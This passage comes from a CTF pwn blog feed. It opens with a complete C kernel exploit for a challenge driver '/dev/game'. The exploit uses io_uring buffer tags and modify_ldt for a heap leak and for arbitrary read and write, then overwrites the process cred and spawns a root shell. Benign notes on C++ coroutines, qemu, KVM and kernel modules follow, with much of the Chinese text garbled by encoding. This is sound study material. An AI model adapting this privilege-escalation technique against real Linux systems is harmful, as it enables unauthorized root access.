class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;liburing.h&quot;</span></span><br><br><span class="hljs-keyword">int</span> fd = <span class="hljs-number">-1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGESIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ProcessNUM  0x30</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UringNUM 0x20</span><br><span class="hljs-keyword">pid_t</span> processes[ProcessNUM];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __ID__ <span class="hljs-meta-string">&quot;wawwwwww&quot;</span></span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>, <span class="hljs-title">ring1</span>, <span class="hljs-title">ring2</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> &#123;</span><br>    <span class="hljs-keyword">size_t</span>   entries;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nr_entries;<br>    <span class="hljs-keyword">int</span>         slot;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_uring</span><span class="hljs-params">()</span></span>&#123;<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring, <span class="hljs-number">0</span>);<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring1,<span class="hljs-number">0</span>);<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring2,<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">register_tag</span><span class="hljs-params">(struct io_uring *ring,<span class="hljs-keyword">size_t</span> *data,<span class="hljs-keyword">int</span> num)</span></span>&#123;<br>    <span class="hljs-keyword">char</span> tmp_buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">vecs</span>[<span class="hljs-title">num</span>];</span><br>    <span class="hljs-keyword">size_t</span> tags[num];<br>    <span class="hljs-built_in">memcpy</span>(tags,data,num*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;num;i++)&#123;<br>        vecs[i].iov_base = tmp_buf;<br>        vecs[i].iov_len = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//io_alloc_page_table</span><br>    <span class="hljs-keyword">int</span> res = io_uring_register_buffers_tags(ring,vecs,tags,num);<span class="hljs-comment">//kcalloc(nr_tables, sizeof(*table), GFP_KERNEL_ACCOUNT);</span><br>    <span class="hljs-keyword">if</span> (res &lt; <span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>,res));<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update_tag</span><span class="hljs-params">(struct io_uring *ring,<span class="hljs-keyword">size_t</span> Data,<span class="hljs-keyword">int</span> num)</span></span>&#123;<br>    <span class="hljs-keyword">char</span> tmp_buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">vecs</span>[2];</span><br>    vecs[<span class="hljs-number">0</span>].iov_base = tmp_buf;<br>    vecs[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">1</span>;<br>    vecs[<span class="hljs-number">1</span>].iov_base = tmp_buf;<br>    vecs[<span class="hljs-number">1</span>].iov_len = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="hljs-number">0</span>,vecs,Data,num);<br>    <span class="hljs-keyword">if</span> (ret &lt;<span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>,ret));<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spawn_processes</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ProcessNUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">pid_t</span> child = fork();<br>        <span class="hljs-keyword">if</span> (child == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (prctl(PR_SET_NAME, __ID__, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>                perror(<span class="hljs-string">&quot;Could not set name&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">uid_t</span> old = getuid();<br>            kill(getpid(), SIGSTOP);<br>            <span class="hljs-keyword">uid_t</span> uid = getuid();<br>            <span class="hljs-keyword">if</span> (uid == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enjoy root!&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(uid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (child &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> child;<br>        &#125;<br>        processes[i] = child;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">find_cred</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> heap)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> <span class="hljs-title">ldt</span>;</span><br>    <span class="hljs-keyword">char</span> buf[PAGESIZE];<br>    <span class="hljs-keyword">size_t</span> *result_addr;<br>    <span class="hljs-keyword">size_t</span> cred_addr = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">int</span> res = pipe(pipe_fd);<br>    <span class="hljs-keyword">if</span>(res)<br>        errExit(<span class="hljs-string">&quot;pipe&quot;</span>);<br><br>    heap = (heap/<span class="hljs-number">0x1000</span>)*<span class="hljs-number">0x1000</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; PAGESIZE*PAGESIZE ; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i &amp;&amp; (i % <span class="hljs-number">0x100</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;looked up range from %p ~ %p\n&quot;</span>,heap - i * PAGESIZE,heap + i * PAGESIZE);<br>        &#125;<br>        <span class="hljs-comment">//Forward search</span><br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,PAGESIZE);<br>        ldt.entries = heap - i * PAGESIZE;<br>        ldt.nr_entries = PAGESIZE/<span class="hljs-number">8</span>;<br>        update_tag(&amp;ring,&amp;ldt,<span class="hljs-number">2</span>);<span class="hljs-comment">//Setting the search Address</span><br>        <span class="hljs-keyword">if</span>(!fork())&#123;<br>            <span class="hljs-keyword">int</span> res = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, PAGESIZE);<br>            <span class="hljs-keyword">if</span>(res == PAGESIZE)&#123;<br>                result_addr = (<span class="hljs-keyword">size_t</span>*) memmem(buf, <span class="hljs-number">0x1000</span>, __ID__, <span class="hljs-number">8</span>);<br>                <span class="hljs-keyword">if</span> (result_addr)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="hljs-number">-2</span>]);<br>                    cred_addr = result_addr[<span class="hljs-number">-2</span>];<br>                &#125;<br>                write(pipe_fd[<span class="hljs-number">1</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (cred_addr != <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//Search backwards</span><br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,PAGESIZE);<br>        ldt.entries = heap + i * PAGESIZE;<br>        ldt.nr_entries = PAGESIZE/<span class="hljs-number">8</span>;<br>        update_tag(&amp;ring,&amp;ldt,<span class="hljs-number">2</span>);<span class="hljs-comment">//Setting the search Address</span><br>        <span class="hljs-keyword">if</span>(!fork())&#123;<br>            <span class="hljs-keyword">int</span> res = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, PAGESIZE);<br>            <span class="hljs-keyword">if</span>(res == PAGESIZE)&#123;<br>                result_addr = (<span class="hljs-keyword">size_t</span>*) memmem(buf, <span class="hljs-number">0x1000</span>, __ID__, <span class="hljs-number">8</span>);<br>                <span class="hljs-keyword">if</span> (result_addr)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="hljs-number">-2</span>]);<br>                    cred_addr = result_addr[<span class="hljs-number">-2</span>];<br>                &#125;<br>                write(pipe_fd[<span class="hljs-number">1</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (cred_addr != <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> cred_addr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spawn_root_shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ProcessNUM; i++)<br>    &#123;<br>        kill(processes[i], SIGCONT);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(wait(<span class="hljs-literal">NULL</span>) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_desc</span> <span class="hljs-title">desc</span>;</span><br>    <span class="hljs-keyword">size_t</span> leak_heap,cred;<br>    <span class="hljs-keyword">size_t</span> Data[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-built_in">memset</span>(Data,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(Data));<br>    <span class="hljs-built_in">memset</span>(&amp;desc,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(struct user_desc));<br>    <span class="hljs-keyword">char</span> leak[<span class="hljs-number">0x10</span>];<br>    fd = open(<span class="hljs-string">&quot;/dev/game&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fail to open dev&quot;</span>);<br><br>    ioctl(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    spawn_processes();<br><br><span class="hljs-comment">//1. leak heap addr</span><br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kmalloc(0x10) == context-&gt;cur-&gt;magic</span><br>    init_uring();<br>    ioctl(fd,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kfree</span><br>    syscall(SYS_modify_ldt, <span class="hljs-number">1</span>, &amp;desc, <span class="hljs-keyword">sizeof</span>(desc));<span class="hljs-comment">//write_ldt</span><br>    read(fd,leak,<span class="hljs-number">0x10</span>);<span class="hljs-comment">//leak, ä½¿ç”¨ldt_structç¬¬ä¸€ä¸ªæŒ‡é’ˆ(ä¹Ÿæ˜¯æŒ‡å‘heap). </span><br>    leak_heap = *(<span class="hljs-keyword">size_t</span>*)leak;<br>    <span class="hljs-keyword">if</span>((!leak_heap))<br>        errExit(<span class="hljs-string">&quot;\033[31m[-] Could not leak heap_addr \033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] leak heap_addr: \033[0m0x%lx\n&quot;</span>, leak_heap);<br><br><span class="hljs-comment">//2. Find cred&#x27;struct by arbitrary address read </span><br>    ioctl(fd,<span class="hljs-number">22</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//kfree</span><br>    Data[<span class="hljs-number">0</span>] = leak_heap;<br>    register_tag(&amp;ring,Data,<span class="hljs-number">2</span>);<span class="hljs-comment">//kzalloc</span><br>    cred = find_cred(leak_heap);<br><br><span class="hljs-comment">//3. Overwrite uid and gid by Arbitrary address write</span><br>    close(fd);<br>    fd = open(<span class="hljs-string">&quot;/dev/game&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fail to open dev&quot;</span>);<br>    ioctl(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kmalloc(0x10)</span><br>    ioctl(fd,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kfree</span><br>    register_tag(&amp;ring1,Data,PAGESIZE/<span class="hljs-number">8</span> + <span class="hljs-number">1</span>);<span class="hljs-comment">//io_alloc_page_table</span><br>    ioctl(fd,<span class="hljs-number">22</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//kfree</span><br>    Data[<span class="hljs-number">0</span>] = cred+<span class="hljs-number">4</span>;<br>    register_tag(&amp;ring2,Data,<span class="hljs-number">2</span>);<span class="hljs-comment">//tags[0] = cred+4</span><br>    Data[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    update_tag(&amp;ring1,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//&#123;long&#125;cred+4 = 0</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)&#123; <span class="hljs-comment">//overwrite two ids and groups</span><br>        Data[<span class="hljs-number">0</span>] = cred+<span class="hljs-number">4</span>+<span class="hljs-number">8</span>*(i+<span class="hljs-number">1</span>);<br>        update_tag(&amp;ring2,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//tags[0] = cred+4+8*(i+1)</span><br>        Data[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        update_tag(&amp;ring1,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//&#123;long&#125;cred+4+8*(i+1) = 0</span><br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done \033[0m&quot;</span>);<br>    spawn_root_shell();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m[-] It should never be here \033[0m&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="idek2022"><a href="#idek2022" class="headerlink" title="idek2022"></a>idek2022</h1><h2 id="Coroutine"><a href="#Coroutine" class="headerlink" title="Coroutine"></a>Coroutine</h2><p>ä¸»è¦çœ‹<a href="https://kiprey.github.io/2023/01/idek_coroutine/">è‚–ä½¬çš„wp</a>. åšä¸€ç‚¹ä¸ªäººè¡¥å……. </p><p>ä»€ä¹ˆæ˜¯åç¨‹: <a href="https://lewissbaker.github.io/2017/11/17/understanding-operator-co-await">æ¯”è¾ƒå…¨çš„è‹±æ–‡blog</a> | <a href="https://zhuanlan.zhihu.com/p/497224333">CSDNå®˜æ–¹æ–‡ç« </a> : åè€…çš„ä¾‹å­ä¸­å¹¶æ²¡æœ‰<code>.resume</code>æ“ä½œ, ç›´æ¥sleepä»£æ›¿äº†, ä¸å¤ªå®Œå–„. </p><p><a href="https://devblogs.microsoft.com/oldnewthing/20210329-00/?p=105015">éå¸¸å…¨çš„ MS blog</a> </p><ul><li><code>co_await co_yield co_return</code> æœ‰ä¸€ä¸ªå…³é”®å­—è¯¥å‡½æ•°å°±ç®—æ˜¯åç¨‹. </li><li><code>struct promise_type</code>ç”¨äºå®šä¹‰ä¸€ç±»åç¨‹çš„è¡Œä¸º, ç¼–è¯‘å™¨è¿˜ä¼šæŠŠcoroutine_handleç´§æŒ¨ç€promise_typeä¸€èµ·æ”¾åœ¨åç¨‹æ ˆå¸§çš„å¼€å¤´. </li><li>è€Œè·Ÿåœ¨<code>co_wait</code>åçš„æ˜¯ä¸€ä¸ªstruct, å®šä¹‰äº† await_readyã€await_suspend å’Œ await_resume æ–¹æ³•çš„ç±»å‹. </li><li><code>co_wait</code>å±•å¼€åæ˜¯å¦‚ä¸‹çº¢è‰²åŒºåŸŸ, åœ¨ä¸»çº¿ç¨‹åˆ›å»ºæ–°çº¿ç¨‹å, æ»¡è¶³ä¸€å®šæ¡ä»¶æ—¶ä¼šè¿”å›caller, å½“å¯ä»¥ç»§ç»­æ‰§è¡Œæ—¶åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œ<code>handle.resume()</code>, å­çº¿ç¨‹å°±ä¼šç»§ç»­æ‰§è¡Œåç¨‹ä¸­å‰©ä½™ä»£ç . ä¸€ä¸ª<a href="https://godbolt.org/z/nbM5YcWeT">ä»£ç ä¾‹å­</a>. </li></ul><img src="https://s2.loli.net/2023/02/16/LJGcbS9DlR5IadH.jpg" alt="img" style="zoom:50%;" /><p>å°è¯•å¤ç°ä¸­é‡åˆ°ä¸€ç‚¹å°é—®é¢˜:</p><ul><li>ä»£ç ä¾‹å­ä¸­ç¼–è¯‘é€‰é¡¹è¦åŠ ä¸Š-fcoroutines. </li><li>vscodeæ— æ³•è¯†åˆ«coroutine, è¦åœ¨C++ Intellisense-&gt;Cpp standardé€‰æ‹©C++20. </li><li>ä¸€çœ‹ä»£ç æ²¡å‘ç°bind, ç»“æœæ˜¯ç›´æ¥ä½¿ç”¨é»˜è®¤port, ç„¶åstdoutä¼ ç»™pyè„šæœ¬, å†ç”¨socatæ¥exportç‰¹å®šç«¯å£(12345). </li><li>å¤ä¹ äº†std::spanå’Œstd::optional. </li><li><code>final_suspend()</code>åœ¨cppreféƒ½æœä¸åˆ°æ€ä¹ˆsuspend. è¿˜å¾—çœ‹MSçš„æ–‡ç« . </li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFé›¶æ•£çš„çŸ¥è¯†ç‚¹</title>
    <link href="/2022-07/Now-CTF-supplement/"/>
    <url>/2022-07/Now-CTF-supplement/</url>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªå†™çš„æŒºç³Ÿç³•çš„, åªæœ‰ret2dlresolveèƒ½çœ‹ä¸€çœ‹. kernel pwnçš„éƒ¨åˆ†ç›´æ¥çœ‹<a href="../pwn_new/pwn_kernel_basic.md">å¦å¤–ä¸€ç¯‡</a>. </p><ul><li><a href="https://ccap.udel.edu/2021/10/20/ctf/">CTF types</a> : Jeopardy, Attack-Defence and mixed.</li><li>eehhhhhh, å®Œå…¨ä¸çŸ¥é“CTFtimesæ€ä¹ˆç”¨â€¦ ç°åœ¨å¤§æ¦‚çŸ¥é“äº†</li></ul><h2 id="a-new-start-from-SCTF-flying-kernel"><a href="#a-new-start-from-SCTF-flying-kernel" class="headerlink" title="a new start from SCTF-flying_kernel"></a>a new start from SCTF-flying_kernel</h2><p>the following is a few concepts.</p><p><img src="../../image/CTF_newly_start/image-20220710173158610.png" alt="image-20220710173158610"></p><blockquote><p><em><strong>What is the <code>-initrd</code> in qemu command line used for?</strong></em> </p><p>It is used to init RAM disk, which utilize RAM with a drive to act like an SSD disk.</p><p>And look this <a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">answer</a> </p></blockquote><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>review the concepts of docker.</p><img src="../../image/CTF_newly_start/architecture.svg" alt="Docker Architecture Diagram" style="zoom:80%;" /><p><del>Docker Desktop needs Ubuntu 22.04â€¦. a new VM.</del> Okay, left the Docker Destkop away. </p><p>details are written in <em>linux relative hints</em> </p><h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>run <code>kvm-ok</code> in kali shows NOT SUPPORT at first, then i try to update the VM hardware compatibility in vmware, now it works. </p><p>the flying-kernel is using qemu in the container, but i find that there is a <code>-cpu kvm64, +semp</code> argument. It means a processor with kvm enabled. and when i search on google it says qemu may utilize the kvm to accelerate itself. </p><blockquote><h3 id="VMWare"><a href="#VMWare" class="headerlink" title="VMWare"></a>VMWare</h3><p>it relies on software to simulate hardware functionality and create a virtual compoter system.</p></blockquote><h3 id="SMP"><a href="#SMP" class="headerlink" title="SMP"></a>SMP</h3><blockquote><p><em>from wikipedia</em>.</p></blockquote><p><strong>Symmetric multiprocessing</strong> or <strong>shared-memory multiprocessing</strong> (<strong>SMP</strong>) involves a multiprocessor computer hardware and software architecture where two or more identical processors are connected to a single, shared main memory, have full access to all input and output devices, and are controlled by a single operating system instance that treats all processors equally, reserving none for special purposes. </p><h3 id="CPUID"><a href="#CPUID" class="headerlink" title="CPUID"></a>CPUID</h3><p>SMEP and SMAP.</p><p><a href="https://wiki.osdev.org/Supervisor_Memory_Protection">https://wiki.osdev.org/Supervisor_Memory_Protection</a></p><h3 id="xinetd"><a href="#xinetd" class="headerlink" title="xinetd"></a>xinetd</h3><p><a href="https://en.wikipedia.org/wiki/Xinetd">wiki</a> | <a href="https://linux.die.net/man/5/xinetd.conf">.conf man page</a>   </p><h3 id="Kernel-Module"><a href="#Kernel-Module" class="headerlink" title="Kernel Module"></a>Kernel Module</h3><ul><li><code>modinfo</code> <code>modprobe</code>(intelligently add or remove modules) <code>mknod</code> </li><li>modules are object files whose symbols get resolved <strong>upon running insmod or modprobe</strong>.</li><li>Arguments (a <a href="https://www.linux.com/training-tutorials/kernel-newbie-corner-everything-you-wanted-know-about-module-parameters/">post</a>) <ul><li><code>module_param(var, int, 0644)</code> can take the arguments(<code>var</code>) passed by <code>insmod xxx var=5</code> to a Module with permissions(<code>0644</code>).<br>or <code>module_param(mylong, long, S_IRUSR)</code> </li><li><code>MODULE_PARM_DESC()</code> used to document argument that the module can take. Will show in the <code>modinfoÂ xx.ko</code>. </li></ul></li><li>device driver: <ul><li><code>ll /dev</code> =&gt; <code>crw-rw---- 1 root dial 4, 67 Jul 5 2000 /dev/ttyS3</code><br>c -&gt; character device, 4 -&gt; major number, 67 -&gt; minor number.  Major number <a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/Documentation/admin-guide/devices.txt">assigned list</a> </li></ul></li><li><code>/proc file system</code>: Originally designed to allow easy access to information about processes (hence the name), it is now used by every bit of the kernel which has something interesting to report<ul><li>use <code>/proc file system</code> to get module info in user-land program. such as <code>proc_create()</code> <code>proc_remove()</code> functions.</li></ul></li><li><code>class_create()</code> A class is a higher-level view of a device that abstracts out low-level implementation details.<br><a href="F:\linux-5.18.11\include\linux\device\class.h">header file</a> </li><li>to be continuedâ€¦</li></ul><h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><ul><li><a href="https://www.sudo.ws/docs/man/sudoers.man/"><code>sudoers</code></a> â€” default sudo security policy plugin </li></ul><h2 id="flying-kernel"><a href="#flying-kernel" class="headerlink" title="flying-kernel"></a><del>flying-kernel</del></h2><p>å¾ˆå¥½, åˆå‘ç°ä»–ç”¨çš„æ˜¯å­—ç¬¦è®¾å¤‡çš„kernel module, ç»§ç»­çœ‹kernel moduleæ–‡æ¡£(åœ¨ä¸Šé¢).</p><blockquote><p><a href="https://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II">ä»£ä½¬åšå®¢æ€»ç»“</a> </p></blockquote><p>ç°åœ¨åˆå‘ç°CTF-wikiä¸Šæœ‰å†…æ ¸çš„çŸ¥è¯†, ä¸€å¤§å †ä¸œè¥¿æ¥ç€pwn.collegeåé¢, æ‰€ä»¥è¿˜å¾—å…ˆå­¦æ‰é‚£äº›ä¸œè¥¿â€¦. ä¸ç„¶ä»€ä¹ˆsmap smepä¿æŠ¤éƒ½ä¸çŸ¥é“æ€ä¹ˆç”¨. 